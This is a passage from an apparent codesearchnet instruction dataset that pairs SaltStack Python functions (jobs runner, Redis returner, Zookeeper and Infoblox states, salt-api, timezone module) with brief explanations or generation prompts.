log.error(\n                    '\\'dateutil\\' library not available, skipping end_time '\n                    'comparison.'\n                )\n\n        if _match:\n            mret[item] = ret[item]\n\n    if outputter:\n        return {'outputter': outputter, 'data': mret}\n    else:\n        return mret", "response": "Return a list of all detectable jobs and associated functions in a specific external job cache."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef list_jobs_filter(count,\n                     filter_find_job=True,\n                     ext_source=None,\n                     outputter=None,\n                     display_progress=False):\n    '''\n    List all detectable jobs and associated functions\n\n    ext_source\n        The external job cache to use. Default: `None`.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run jobs.list_jobs_filter 50\n        salt-run jobs.list_jobs_filter 100 filter_find_job=False\n\n    '''\n    returner = _get_returner((\n        __opts__['ext_job_cache'],\n        ext_source,\n        __opts__['master_job_cache']\n    ))\n    if display_progress:\n        __jid_event__.fire_event(\n            {'message': 'Querying returner {0} for jobs.'.format(returner)},\n            'progress'\n        )\n    mminion = salt.minion.MasterMinion(__opts__)\n\n    fun = '{0}.get_jids_filter'.format(returner)\n    if fun not in mminion.returners:\n        raise NotImplementedError(\n            '\\'{0}\\' returner function not implemented yet.'.format(fun)\n        )\n    ret = mminion.returners[fun](count, filter_find_job)\n\n    if outputter:\n        return {'outputter': outputter, 'data': ret}\n    else:\n        return ret", "response": "List all detectable jobs and associated functions"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef print_job(jid, ext_source=None):\n    '''\n    Print a specific job's detail given by it's jid, including the return data.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run jobs.print_job 20130916125524463507\n    '''\n    ret = {}\n\n    returner = _get_returner((\n        __opts__['ext_job_cache'],\n        ext_source,\n        __opts__['master_job_cache']\n    ))\n    mminion = salt.minion.MasterMinion(__opts__)\n\n    try:\n        job = mminion.returners['{0}.get_load'.format(returner)](jid)\n        ret[jid] = _format_jid_instance(jid, job)\n    except TypeError:\n        ret[jid]['Result'] = (\n            'Requested returner {0} is not available. Jobs cannot be '\n            'retrieved. Check master log for details.'.format(returner)\n        )\n        return ret\n    ret[jid]['Result'] = mminion.returners['{0}.get_jid'.format(returner)](jid)\n\n    fstr = '{0}.get_endtime'.format(__opts__['master_job_cache'])\n    if (__opts__.get('job_cache_store_endtime')\n            and fstr in mminion.returners):\n        endtime = mminion.returners[fstr](jid)\n        if endtime:\n            ret[jid]['EndTime'] = endtime\n\n    return ret", "response": "Print a specific job s detail given by it s jid including the return data."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef exit_success(jid, ext_source=None):\n    '''\n    Check if a job has been executed and exit successfully\n\n    jid\n        The jid to look up.\n    ext_source\n        The external job cache to use. Default: `None`.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run jobs.exit_success 20160520145827701627\n    '''\n    ret = dict()\n\n    data = list_job(\n        jid,\n        ext_source=ext_source\n    )\n\n    minions = data.get('Minions', [])\n    result = data.get('Result', {})\n\n    for minion in minions:\n        if minion in result and 'return' in result[minion]:\n            ret[minion] = True if result[minion]['return'] else False\n        else:\n            ret[minion] = False\n\n    for minion in result:\n        if 'return' in result[minion] and result[minion]['return']:\n            ret[minion] = True\n    return ret", "response": "Check if a job has been executed and exit successfully"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef last_run(ext_source=None,\n             outputter=None,\n             metadata=None,\n             function=None,\n             target=None,\n             display_progress=False):\n    '''\n    .. versionadded:: 2015.8.0\n\n    List all detectable jobs and associated functions\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run jobs.last_run\n        salt-run jobs.last_run target=nodename\n        salt-run jobs.last_run function='cmd.run'\n        salt-run jobs.last_run metadata=\"{'foo': 'bar'}\"\n    '''\n\n    if metadata:\n        if not isinstance(metadata, dict):\n            log.info('The metadata parameter must be specified as a dictionary')\n            return False\n\n    _all_jobs = list_jobs(ext_source=ext_source,\n                          outputter=outputter,\n                          search_metadata=metadata,\n                          search_function=function,\n                          search_target=target,\n                          display_progress=display_progress)\n    if _all_jobs:\n        last_job = sorted(_all_jobs)[-1]\n        return print_job(last_job, ext_source)\n    else:\n        return False", "response": "List all detectable jobs and associated functions and print the last job."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nwalks through the job dir and return jobs", "response": "def _walk_through(job_dir, display_progress=False):\n    '''\n    Walk through the job dir and return jobs\n    '''\n    serial = salt.payload.Serial(__opts__)\n\n    for top in os.listdir(job_dir):\n        t_path = os.path.join(job_dir, top)\n\n        for final in os.listdir(t_path):\n            load_path = os.path.join(t_path, final, '.load.p')\n            with salt.utils.files.fopen(load_path, 'rb') as rfh:\n                job = serial.load(rfh)\n\n            if not os.path.isfile(load_path):\n                continue\n\n            with salt.utils.files.fopen(load_path, 'rb') as rfh:\n                job = serial.load(rfh)\n            jid = job['jid']\n            if display_progress:\n                __jid_event__.fire_event(\n                    {'message': 'Found JID {0}'.format(jid)},\n                    'progress'\n                )\n            yield jid, job, t_path, final"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ntriggering an event in IFTTT.", "response": "def trigger_event(name,\n                  event,\n                  value1=None,\n                  value2=None,\n                  value3=None\n                  ):\n    '''\n    Trigger an event in IFTTT\n\n    .. code-block:: yaml\n\n        ifttt-event:\n          ifttt.trigger_event:\n            - event: TestEvent\n            - value1: 'A value that we want to send.'\n            - value2: 'A second value that we want to send.'\n            - value3: 'A third value that we want to send.'\n\n    The following parameters are required:\n\n    name\n        The unique name for this event.\n\n    event\n        The name of the event to trigger in IFTTT.\n\n    The following parameters are optional:\n\n    value1\n        One of the values that we can send to IFTT.\n\n    value2\n        One of the values that we can send to IFTT.\n\n    value3\n        One of the values that we can send to IFTT.\n    '''\n    ret = {'name': name,\n           'changes': {},\n           'result': False,\n           'comment': ''}\n\n    if __opts__['test']:\n        ret['comment'] = 'The following trigger would be sent to IFTTT: {0}'.format(event)\n        ret['result'] = None\n        return ret\n\n    ret['result'] = __salt__['ifttt.trigger_event'](\n        event=event,\n        value1=value1,\n        value2=value2,\n        value3=value3\n    )\n\n    if ret and ret['result']:\n        ret['result'] = True\n        ret['comment'] = 'Triggered Event: {0}'.format(name)\n    else:\n        ret['comment'] = 'Failed to trigger event: {0}'.format(name)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nensure the CNAME with the given name or canonical name is removed", "response": "def absent(name=None, canonical=None, **api_opts):\n    '''\n    Ensure the CNAME with the given name or canonical name is removed\n    '''\n    ret = {'name': name, 'result': False, 'comment': '', 'changes': {}}\n    obj = __salt__['infoblox.get_cname'](name=name, canonical=canonical, **api_opts)\n\n    if not obj:\n        ret['result'] = True\n        ret['comment'] = 'infoblox already removed'\n        return ret\n\n    if __opts__['test']:\n        ret['result'] = None\n        ret['changes'] = {'old': obj, 'new': 'absent'}\n        return ret\n\n    if __salt__['infoblox.delete_cname'](name=name, canonical=canonical, **api_opts):\n        ret['result'] = True\n        ret['changes'] = {'old': obj, 'new': 'absent'}\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _get_options(ret=None):\n    '''\n    Get the redis options from salt.\n    '''\n    attrs = {'host': 'host',\n             'port': 'port',\n             'unix_socket_path': 'unix_socket_path',\n             'db': 'db',\n             'password': 'password',\n             'cluster_mode': 'cluster_mode',\n             'startup_nodes': 'cluster.startup_nodes',\n             'skip_full_coverage_check': 'cluster.skip_full_coverage_check',\n             }\n\n    if salt.utils.platform.is_proxy():\n        return {\n            'host': __opts__.get('redis.host', 'salt'),\n            'port': __opts__.get('redis.port', 6379),\n            'unix_socket_path': __opts__.get('redis.unix_socket_path', None),\n            'db': __opts__.get('redis.db', '0'),\n            'password': __opts__.get('redis.password', ''),\n            'cluster_mode': __opts__.get('redis.cluster_mode', False),\n            'startup_nodes': __opts__.get('redis.cluster.startup_nodes', {}),\n            'skip_full_coverage_check': __opts__.get('redis.cluster.skip_full_coverage_check', False)\n        }\n\n    _options = salt.returners.get_returner_options(__virtualname__,\n                                                   ret,\n                                                   attrs,\n                                                   __salt__=__salt__,\n                                                   __opts__=__opts__)\n    return _options", "response": "Get the redis options from salt.\n   "}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a redis server object", "response": "def _get_serv(ret=None):\n    '''\n    Return a redis server object\n    '''\n    _options = _get_options(ret)\n    global REDIS_POOL\n    if REDIS_POOL:\n        return REDIS_POOL\n    elif _options.get('cluster_mode'):\n        REDIS_POOL = StrictRedisCluster(startup_nodes=_options.get('startup_nodes'),\n                                        skip_full_coverage_check=_options.get('skip_full_coverage_check'),\n                                        decode_responses=True)\n    else:\n        REDIS_POOL = redis.StrictRedis(host=_options.get('host'),\n                                       port=_options.get('port'),\n                                       unix_socket_path=_options.get('unix_socket_path', None),\n                                       db=_options.get('db'),\n                                       decode_responses=True,\n                                       password=_options.get('password'))\n    return REDIS_POOL"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef returner(ret):\n    '''\n    Return data to a redis data store\n    '''\n    serv = _get_serv(ret)\n    pipeline = serv.pipeline(transaction=False)\n    minion, jid = ret['id'], ret['jid']\n    pipeline.hset('ret:{0}'.format(jid), minion, salt.utils.json.dumps(ret))\n    pipeline.expire('ret:{0}'.format(jid), _get_ttl())\n    pipeline.set('{0}:{1}'.format(minion, ret['fun']), jid)\n    pipeline.sadd('minions', minion)\n    pipeline.execute()", "response": "Return data to a redis data store\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsaves the load to the specified jid", "response": "def save_load(jid, load, minions=None):\n    '''\n    Save the load to the specified jid\n    '''\n    serv = _get_serv(ret=None)\n    serv.setex('load:{0}'.format(jid), _get_ttl(), salt.utils.json.dumps(load))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_load(jid):\n    '''\n    Return the load data that marks a specified jid\n    '''\n    serv = _get_serv(ret=None)\n    data = serv.get('load:{0}'.format(jid))\n    if data:\n        return salt.utils.json.loads(data)\n    return {}", "response": "Return the load data that marks a specified jid\n   "}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_jid(jid):\n    '''\n    Return the information returned when the specified job id was executed\n    '''\n    serv = _get_serv(ret=None)\n    ret = {}\n    for minion, data in six.iteritems(serv.hgetall('ret:{0}'.format(jid))):\n        if data:\n            ret[minion] = salt.utils.json.loads(data)\n    return ret", "response": "Return the information returned when the specified job id was executed\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_fun(fun):\n    '''\n    Return a dict of the last function called for all minions\n    '''\n    serv = _get_serv(ret=None)\n    ret = {}\n    for minion in serv.smembers('minions'):\n        ind_str = '{0}:{1}'.format(minion, fun)\n        try:\n            jid = serv.get(ind_str)\n        except Exception:\n            continue\n        if not jid:\n            continue\n        data = serv.get('{0}:{1}'.format(minion, jid))\n        if data:\n            ret[minion] = salt.utils.json.loads(data)\n    return ret", "response": "Return a dict of the last called function for all minions\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_jids():\n    '''\n    Return a dict mapping all job ids to job information\n    '''\n    serv = _get_serv(ret=None)\n    ret = {}\n    for s in serv.mget(serv.keys('load:*')):\n        if s is None:\n            continue\n        load = salt.utils.json.loads(s)\n        jid = load['jid']\n        ret[jid] = salt.utils.jid.format_jid_instance(jid, load)\n    return ret", "response": "Return a dict mapping all job ids to job information"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef clean_old_jobs():\n    '''\n    Clean out minions's return data for old jobs.\n\n    Normally, hset 'ret:<jid>' are saved with a TTL, and will eventually\n    get cleaned by redis.But for jobs with some very late minion return, the\n    corresponding hset's TTL will be refreshed to a too late timestamp, we'll\n    do manually cleaning here.\n    '''\n    serv = _get_serv(ret=None)\n    ret_jids = serv.keys('ret:*')\n    living_jids = set(serv.keys('load:*'))\n    to_remove = []\n    for ret_key in ret_jids:\n        load_key = ret_key.replace('ret:', 'load:', 1)\n        if load_key not in living_jids:\n            to_remove.append(ret_key)\n    if to_remove:\n        serv.delete(*to_remove)\n        log.debug('clean old jobs: %s', to_remove)", "response": "Clean out jobs that are not in the load list"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\npreparing the salt - api daemon.", "response": "def prepare(self):\n        '''\n        Run the preparation sequence required to start a salt-api daemon.\n\n        If sub-classed, don't **ever** forget to run:\n\n            super(YourSubClass, self).prepare()\n        '''\n        super(SaltAPI, self).prepare()\n\n        try:\n            if self.config['verify_env']:\n                logfile = self.config['log_file']\n                if logfile is not None and not logfile.startswith(('tcp://',\n                                                                   'udp://',\n                                                                   'file://')):\n                    # Logfile is not using Syslog, verify\n                    with salt.utils.files.set_umask(0o027):\n                        verify_files([logfile], self.config['user'])\n        except OSError as err:\n            log.exception('Failed to prepare salt environment')\n            self.shutdown(err.errno)\n\n        self.setup_logfile_logger()\n        verify_log(self.config)\n        log.info('Setting up the Salt API')\n        self.api = salt.client.netapi.NetapiClient(self.config)\n        self.daemonize_if_required()\n        self.set_pidfile()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nstart the actual master. If sub-classed, don't **ever** forget to run: super(YourSubClass, self).start() NOTE: Run any required code before calling `super()`.", "response": "def start(self):\n        '''\n        Start the actual master.\n\n        If sub-classed, don't **ever** forget to run:\n\n            super(YourSubClass, self).start()\n\n        NOTE: Run any required code before calling `super()`.\n        '''\n        super(SaltAPI, self).start()\n        if check_user(self.config['user']):\n            log.info('The salt-api is starting up')\n            self.api.run()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nshutting down the salt - api.", "response": "def shutdown(self, exitcode=0, exitmsg=None):\n        '''\n        If sub-classed, run any shutdown operations on this method.\n        '''\n        log.info('The salt-api is shutting down..')\n        msg = 'The salt-api is shutdown. '\n        if exitmsg is not None:\n            exitmsg = msg + exitmsg\n        else:\n            exitmsg = msg.strip()\n        super(SaltAPI, self).shutdown(exitcode, exitmsg)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef present(name, value, acls=None, ephemeral=False, sequence=False, makepath=False, version=-1,\n            profile=None, hosts=None, scheme=None, username=None, password=None, default_acl=None):\n    '''\n    Make sure znode is present in the correct state with the correct acls\n\n    name\n        path to znode\n\n    value\n        value znode should be set to\n\n    acls\n        list of acl dictionaries to set on znode (make sure the ones salt is connected with are included)\n        Default: None\n\n    ephemeral\n        Boolean to indicate if ephemeral znode should be created\n        Default: False\n\n    sequence\n        Boolean to indicate if znode path is suffixed with a unique index\n        Default: False\n\n    makepath\n        Boolean to indicate if the parent paths should be created\n        Default: False\n\n    version\n        For updating, specify the version which should be updated\n        Default: -1 (always match)\n\n    profile\n        Configured Zookeeper profile to authenticate with (Default: None)\n\n    hosts\n        Lists of Zookeeper Hosts (Default: '127.0.0.1:2181)\n\n    scheme\n        Scheme to authenticate with (Default: 'digest')\n\n    username\n        Username to authenticate (Default: None)\n\n    password\n        Password to authenticate (Default: None)\n\n    default_acl\n        Default acls to assign if a node is created in this connection (Default: None)\n\n    .. code-block:: yaml\n\n        add znode:\n          zookeeper.present:\n            - name: /test/name\n            - value: gtmanfred\n            - makepath: True\n\n        update znode:\n          zookeeper.present:\n            - name: /test/name\n            - value: daniel\n            - acls:\n              - username: daniel\n                password: test\n                read: true\n              - username: gtmanfred\n                password: test\n                read: true\n                write: true\n                create: true\n                delete: true\n                admin: true\n            - makepath: True\n    '''\n\n    ret = {'name': name,\n           'result': False,\n           'comment': 'Failed to setup znode {0}'.format(name),\n           'changes': {}}\n    connkwargs = {'profile': profile, 'hosts': hosts, 'scheme': scheme,\n                  'username': username, 'password': password,\n                  'default_acl': default_acl}\n    if acls is None:\n        chk_acls = []\n    else:\n        chk_acls = [__salt__['zookeeper.make_digest_acl'](**acl) for acl in acls]\n    if __salt__['zookeeper.exists'](name, **connkwargs):\n        cur_value = __salt__['zookeeper.get'](name, **connkwargs)\n        cur_acls = __salt__['zookeeper.get_acls'](name, **connkwargs)\n        if cur_value == value and (not chk_acls or _check_acls(cur_acls, chk_acls)):\n            ret['result'] = True\n            ret['comment'] = 'Znode {0} is already set to the correct value with the correct acls'.format(name)\n            return ret\n        elif __opts__['test'] is True:\n            ret['result'] = None\n            ret['comment'] = 'Znode {0} will be updated'.format(name)\n            ret['changes']['old'] = {}\n            ret['changes']['new'] = {}\n            if value != cur_value:\n                ret['changes']['old']['value'] = cur_value\n                ret['changes']['new']['value'] = value\n            if chk_acls and not _check_acls(chk_acls, cur_acls):\n                ret['changes']['old']['acls'] = cur_acls\n                ret['changes']['new']['acls'] = chk_acls\n            return ret\n        else:\n            value_result, acl_result = True, True\n            changes = {}\n            if value != cur_value:\n                __salt__['zookeeper.set'](name, value, version, **connkwargs)\n                new_value = __salt__['zookeeper.get'](name, **connkwargs)\n                value_result = new_value == value\n                changes.setdefault('new', {}).setdefault('value', new_value)\n                changes.setdefault('old', {}).setdefault('value', cur_value)\n            if chk_acls and not _check_acls(chk_acls, cur_acls):\n                __salt__['zookeeper.set_acls'](name, acls, version, **connkwargs)\n                new_acls = __salt__['zookeeper.get_acls'](name, **connkwargs)\n                acl_result = _check_acls(new_acls, chk_acls)\n                changes.setdefault('new', {}).setdefault('acls', new_acls)\n                changes.setdefault('old', {}).setdefault('value', cur_acls)\n            ret['changes'] = changes\n            if value_result and acl_result:\n                ret['result'] = True\n                ret['comment'] = 'Znode {0} successfully updated'.format(name)\n            return ret\n\n    if __opts__['test'] is True:\n        ret['result'] = None\n        ret['comment'] = '{0} is will be created'.format(name)\n        ret['changes']['old'] = {}\n        ret['changes']['new'] = {}\n        ret['changes']['new']['acls'] = chk_acls\n        ret['changes']['new']['value'] = value\n        return ret\n\n    __salt__['zookeeper.create'](name, value, acls, ephemeral, sequence, makepath, **connkwargs)\n\n    value_result, acl_result = True, True\n    changes = {'old': {}}\n\n    new_value = __salt__['zookeeper.get'](name, **connkwargs)\n    value_result = new_value == value\n    changes.setdefault('new', {}).setdefault('value', new_value)\n\n    new_acls = __salt__['zookeeper.get_acls'](name, **connkwargs)\n    acl_result = acls is None or _check_acls(new_acls, chk_acls)\n    changes.setdefault('new', {}).setdefault('acls', new_acls)\n\n    ret['changes'] = changes\n    if value_result and acl_result:\n        ret['result'] = True\n        ret['comment'] = 'Znode {0} successfully created'.format(name)\n\n    return ret", "response": "Ensures that the named node is present in the correct state with the specified acls."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nensuring that the named znode is absent", "response": "def absent(name, version=-1, recursive=False, profile=None, hosts=None, scheme=None,\n           username=None, password=None, default_acl=None):\n    '''\n    Make sure znode is absent\n\n    name\n        path to znode\n\n    version\n        Specify the version which should be deleted\n        Default: -1 (always match)\n\n    recursive\n        Boolean to indicate if children should be recursively deleted\n        Default: False\n\n    profile\n        Configured Zookeeper profile to authenticate with (Default: None)\n\n    hosts\n        Lists of Zookeeper Hosts (Default: '127.0.0.1:2181)\n\n    scheme\n        Scheme to authenticate with (Default: 'digest')\n\n    username\n        Username to authenticate (Default: None)\n\n    password\n        Password to authenticate (Default: None)\n\n    default_acl\n        Default acls to assign if a node is created in this connection (Default: None)\n\n    .. code-block:: yaml\n\n        delete znode:\n          zookeeper.absent:\n            - name: /test\n            - recursive: True\n    '''\n    ret = {'name': name,\n           'result': False,\n           'comment': 'Failed to delete znode {0}'.format(name),\n           'changes': {}}\n    connkwargs = {'profile': profile, 'hosts': hosts, 'scheme': scheme,\n                  'username': username, 'password': password,\n                  'default_acl': default_acl}\n\n    if __salt__['zookeeper.exists'](name, **connkwargs) is False:\n        ret['result'] = True\n        ret['comment'] = 'Znode {0} does not exist'.format(name)\n        return ret\n\n    changes = {}\n    changes['value'] = __salt__['zookeeper.get'](name, **connkwargs)\n    changes['acls'] = __salt__['zookeeper.get_acls'](name, **connkwargs)\n    if recursive is True:\n        changes['children'] = __salt__['zookeeper.get_children'](name, **connkwargs)\n\n    if __opts__['test'] is True:\n        ret['result'] = None\n        ret['comment'] = 'Znode {0} will be removed'.format(name)\n        ret['changes']['old'] = changes\n        return ret\n\n    __salt__['zookeeper.delete'](name, version, recursive, **connkwargs)\n\n    if __salt__['zookeeper.exists'](name, **connkwargs) is False:\n        ret['result'] = True\n        ret['comment'] = 'Znode {0} has been removed'.format(name)\n        ret['changes']['old'] = changes\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsetting acls on a znode", "response": "def acls(name, acls, version=-1, profile=None, hosts=None, scheme=None,\n         username=None, password=None, default_acl=None):\n    '''\n    Update acls on a znode\n\n    name\n        path to znode\n\n    acls\n        list of acl dictionaries to set on znode\n\n    version\n        Specify the version which should be deleted\n        Default: -1 (always match)\n\n    profile\n        Configured Zookeeper profile to authenticate with (Default: None)\n\n    hosts\n        Lists of Zookeeper Hosts (Default: '127.0.0.1:2181)\n\n    scheme\n        Scheme to authenticate with (Default: 'digest')\n\n    username\n        Username to authenticate (Default: None)\n\n    password\n        Password to authenticate (Default: None)\n\n    default_acl\n        Default acls to assign if a node is created in this connection (Default: None)\n\n    .. code-block:: yaml\n\n        update acls:\n          zookeeper.acls:\n            - name: /test/name\n            - acls:\n              - username: daniel\n                password: test\n                all: True\n              - username: gtmanfred\n                password: test\n                all: True\n    '''\n    ret = {'name': name,\n           'result': False,\n           'comment': 'Failed to set acls on znode {0}'.format(name),\n           'changes': {}}\n    connkwargs = {'profile': profile, 'hosts': hosts, 'scheme': scheme,\n                  'username': username, 'password': password,\n                  'default_acl': default_acl}\n    if isinstance(acls, dict):\n        acls = [acls]\n    chk_acls = [__salt__['zookeeper.make_digest_acl'](**acl) for acl in acls]\n\n    if not __salt__['zookeeper.exists'](name, **connkwargs):\n        ret['comment'] += ': Znode does not exist'\n        return ret\n\n    cur_acls = __salt__['zookeeper.get_acls'](name, **connkwargs)\n    if _check_acls(cur_acls, chk_acls):\n        ret['result'] = True\n        ret['comment'] = 'Znode {0} acls already set'.format(name)\n        return ret\n\n    if __opts__['test'] is True:\n        ret['result'] = None\n        ret['comment'] = 'Znode {0} acls will be updated'.format(name)\n        ret['changes']['old'] = cur_acls\n        ret['changes']['new'] = chk_acls\n        return ret\n\n    __salt__['zookeeper.set_acls'](name, acls, version, **connkwargs)\n\n    new_acls = __salt__['zookeeper.get_acls'](name, **connkwargs)\n    ret['changes'] = {'old': cur_acls, 'new': new_acls}\n    if _check_acls(new_acls, chk_acls):\n        ret['result'] = True\n        ret['comment'] = 'Znode {0} acls updated'.format(name)\n        return ret\n    ret['comment'] = 'Znode {0} acls failed to update'.format(name)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _timedatectl():\n    '''\n    get the output of timedatectl\n    '''\n    ret = __salt__['cmd.run_all'](['timedatectl'], python_shell=False)\n\n    if ret['retcode'] != 0:\n        msg = 'timedatectl failed: {0}'.format(ret['stderr'])\n        raise CommandExecutionError(msg)\n\n    return ret", "response": "get the output of timedatectl\n   "}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the timezone in the system clock", "response": "def _get_adjtime_timezone():\n    '''\n    Return the timezone in /etc/adjtime of the system clock\n    '''\n    adjtime_file = '/etc/adjtime'\n    if os.path.exists(adjtime_file):\n        cmd = ['tail', '-n', '1', adjtime_file]\n        return __salt__['cmd.run'](cmd, python_shell=False)\n    elif os.path.exists('/dev/rtc'):\n        raise CommandExecutionError(\n            'Unable to get hwclock timezone from ' + adjtime_file\n        )\n    else:\n        # There is no RTC.\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the current timezone for the current system", "response": "def get_zone():\n    '''\n    Get current timezone (i.e. America/Denver)\n\n    .. versionchanged:: 2016.11.4\n\n    .. note::\n\n        On AIX operating systems, Posix values can also be returned\n        'CST6CDT,M3.2.0/2:00:00,M11.1.0/2:00:00'\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' timezone.get_zone\n    '''\n    if salt.utils.path.which('timedatectl'):\n        ret = _timedatectl()\n\n        for line in (x.strip() for x in salt.utils.itertools.split(ret['stdout'], '\\n')):\n            try:\n                return re.match(r'Time ?zone:\\s+(\\S+)', line).group(1)\n            except AttributeError:\n                pass\n\n        msg = ('Failed to parse timedatectl output: {0}\\n'\n               'Please file an issue with SaltStack').format(ret['stdout'])\n        raise CommandExecutionError(msg)\n\n    else:\n        if __grains__['os'].lower() == 'centos':\n            return _get_zone_etc_localtime()\n        os_family = __grains__['os_family']\n        for family in ('RedHat', 'Suse'):\n            if family in os_family:\n                return _get_zone_sysconfig()\n        for family in ('Debian', 'Gentoo'):\n            if family in os_family:\n                return _get_zone_etc_timezone()\n        if os_family in ('FreeBSD', 'OpenBSD', 'NetBSD', 'NILinuxRT'):\n            return _get_zone_etc_localtime()\n        elif 'Solaris' in os_family:\n            return _get_zone_solaris()\n        elif 'AIX' in os_family:\n            return _get_zone_aix()\n    raise CommandExecutionError('Unable to get timezone')"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting current numeric timezone offset from UCT", "response": "def get_offset():\n    '''\n    Get current numeric timezone offset from UCT (i.e. -0700)\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' timezone.get_offset\n    '''\n    if 'AIX' not in __grains__['os_family']:\n        return __salt__['cmd.run'](['date', '+%z'], python_shell=False)\n\n    salt_path = '/opt/salt/bin/date'\n\n    if not os.path.exists(salt_path):\n        return 'date in salt binaries does not exist: {0}'.format(salt_path)\n\n    return __salt__['cmd.run']([salt_path, '+%z'], python_shell=False)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsetting the timezone of the current system process.", "response": "def set_zone(timezone):\n    '''\n    Unlinks, then symlinks /etc/localtime to the set timezone.\n\n    The timezone is crucial to several system processes, each of which SHOULD\n    be restarted (for instance, whatever you system uses as its cron and\n    syslog daemons). This will not be automagically done and must be done\n    manually!\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' timezone.set_zone 'America/Denver'\n\n    .. versionchanged:: 2016.11.4\n\n    .. note::\n\n        On AIX operating systems, Posix values are also allowed, see below\n\n    .. code-block:: bash\n\n        salt '*' timezone.set_zone 'CST6CDT,M3.2.0/2:00:00,M11.1.0/2:00:00'\n\n    '''\n    if salt.utils.path.which('timedatectl'):\n        try:\n            __salt__['cmd.run']('timedatectl set-timezone {0}'.format(timezone))\n        except CommandExecutionError:\n            pass\n\n    if 'Solaris' in __grains__['os_family'] or 'AIX' in __grains__['os_family']:\n        zonepath = '/usr/share/lib/zoneinfo/{0}'.format(timezone)\n    else:\n        zonepath = '/usr/share/zoneinfo/{0}'.format(timezone)\n\n    if not os.path.exists(zonepath) and 'AIX' not in __grains__['os_family']:\n        return 'Zone does not exist: {0}'.format(zonepath)\n\n    tzfile = _get_localtime_path()\n    if os.path.exists(tzfile):\n        os.unlink(tzfile)\n\n    if 'Solaris' in __grains__['os_family']:\n        __salt__['file.sed'](\n            '/etc/default/init', '^TZ=.*', 'TZ={0}'.format(timezone))\n    elif 'AIX' in __grains__['os_family']:\n        # timezone could be Olson or Posix\n        curtzstring = get_zone()\n        cmd = ['chtz', timezone]\n        result = __salt__['cmd.retcode'](cmd, python_shell=False)\n        if result == 0:\n            return True\n\n        # restore orig timezone, since AIX chtz failure sets UTC\n        cmd = ['chtz', curtzstring]\n        __salt__['cmd.retcode'](cmd, python_shell=False)\n        return False\n    else:\n        os.symlink(zonepath, tzfile)\n\n    if 'RedHat' in __grains__['os_family']:\n        __salt__['file.sed'](\n            '/etc/sysconfig/clock', '^ZONE=.*', 'ZONE=\"{0}\"'.format(timezone))\n    elif 'Suse' in __grains__['os_family']:\n        __salt__['file.sed'](\n            '/etc/sysconfig/clock', '^TIMEZONE=.*', 'TIMEZONE=\"{0}\"'.format(timezone))\n    elif 'Debian' in __grains__['os_family'] or 'Gentoo' in __grains__['os_family']:\n        with salt.utils.files.fopen('/etc/timezone', 'w') as ofh:\n            ofh.write(salt.utils.stringutils.to_str(timezone).strip())\n            ofh.write('\\n')\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef zone_compare(timezone):\n    '''\n    Compares the given timezone name with the system timezone name.\n    Checks the hash sum between the given timezone, and the one set in\n    /etc/localtime. Returns True if names and hash sums match, and False if not.\n    Mostly useful for running state checks.\n\n    .. versionchanged:: 2016.3.0\n\n    .. note::\n\n        On Solaris-link operating systems only a string comparison is done.\n\n    .. versionchanged:: 2016.11.4\n\n    .. note::\n\n        On AIX operating systems only a string comparison is done.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' timezone.zone_compare 'America/Denver'\n    '''\n    if 'Solaris' in __grains__['os_family'] or 'AIX' in __grains__['os_family']:\n        return timezone == get_zone()\n\n    if 'FreeBSD' in __grains__['os_family']:\n        if not os.path.isfile(_get_localtime_path()):\n            return timezone == get_zone()\n\n    tzfile = _get_localtime_path()\n    zonepath = _get_zone_file(timezone)\n    try:\n        return filecmp.cmp(tzfile, zonepath, shallow=False)\n    except OSError as exc:\n        problematic_file = exc.filename\n        if problematic_file == zonepath:\n            raise SaltInvocationError(\n                'Can\\'t find a local timezone \"{0}\"'.format(timezone))\n        elif problematic_file == tzfile:\n            raise CommandExecutionError(\n                'Failed to read {0} to determine current timezone: {1}'\n                .format(tzfile, exc.strerror))\n        raise", "response": "Compare the given timezone name with 